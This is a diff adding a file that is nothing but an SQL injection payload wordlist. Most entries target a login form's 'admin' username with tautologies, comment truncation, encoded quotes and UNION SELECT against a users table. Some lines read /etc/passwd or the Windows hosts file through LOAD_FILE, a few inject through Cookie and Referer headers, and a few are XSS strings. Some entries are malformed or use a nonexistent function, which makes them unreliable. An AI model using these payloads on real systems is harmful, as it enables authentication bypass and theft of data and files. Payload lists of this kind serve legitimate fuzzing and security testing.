@@ -1,0 +1,98 @@
+0" OR 1=1
+0 OR 1=1
+admin' --
+admin' #
+admin'/*
+' or 1=1 --
+' or 1=1 #
+' or 1=1/*
+admin" --
+admin" #
+admin"/*
+admin'; --
+admin'; #
+admin';/*
+'; SELECT * FROM users --
+'; SELECT * FROM users #
+admin-- -
+admin--/*
+-- SELECT * FROM users
+-- SELECT * FROM users #
+admin'/* --
+admin'/* #
+admin'//
+'/* SELECT * FROM users --
+'/* SELECT * FROM users #
+admin'# --
+admin'# #
+admin'#/*
+'# SELECT * FROM users --
+'# SELECT * FROM users #
+admin'* --
+admin'* #
+admin'/
+'* SELECT * FROM users --
+'* SELECT * FROM users #
+admin' AND (1=1) --
+admin' AND (1=1) #
+admin' AND (1=1)/*
+' AND (1=1) --
+' AND (1=1) #
+' AND (1=1)/*
+admin' = ' or '1'='1' --
+admin' = ' or '1'='1' #
+admin' = ' or '1'='1'/*
+' = ' or '1'='1' --
+' = ' or '1'='1' #
+' = ' or '1'='1'/*
+admin' < '1'='1 --
+admin' < '1'='1 #
+admin' < '1'='1 /*
+' < '1'='1 --
+' < '1'='1' #
+' < '1'='1' /*
+admin' UNION SELECT * FROM users --
+admin' UNION SELECT * FROM users #
+admin' UNION SELECT * FROM users/*
+' UNION SELECT * FROM users --
+' UNION SELECT * FROM users #
+' UNION SELECT * FROM users/*
+admin%' or 1=1 --
+admin%' or 1=1 #
+admin%' or 1=1 /*
+%' or 1=1 --
+%' or 1=1 #
+%' or 1=1 /*
+') or '1' = '1 --
+admin'%00 --
+admin'%00 #
+admin'%00/*
+admin\u0027 --
+admin'%27 --
+admin'%27 /*
+admin%27 --
+admin%27 /*
+admin%2527 --
+admin' COLLATE utf8_general_ci --
+admin' CONVERT(INT, (SELECT @@VERSION)) --
+admin' /*
+admin'; --
+admin';/*
+admin'; SELECT * FROM users --
+admin'\0' --
+admin'\b' --
+admin'\r' --
+admin' UNION SELECT * FROM users WHERE 'x' = LOAD_FILE('/etc/passwd') --
+admin' UNION SELECT * FROM users WHERE 'x' = LOAD_FILE('C:\Windows\System32\drivers\etc\hosts') --
+admin' OR 1=1 --
+admin' AND 1=1 --
+admin' UNION SELECT * FROM users --
+admin'; EXEC sp_executesql N'SELECT * FROM users' --
+admin'; SELECT * FROM dbo.GetUsers() --
+Cookie: admin' --
+Referer: http://example.com/?username=admin' --
+<script>alert('admin')</script> --
+<style>body { background-image: url('javascript:alert("admin")'); }</style> --
+admin' -- foo
+admin'/*
+admin' UNION SELECT * FROM users WHERE 'x' = EXTERNAL_URL('file:///etc/passwd') --
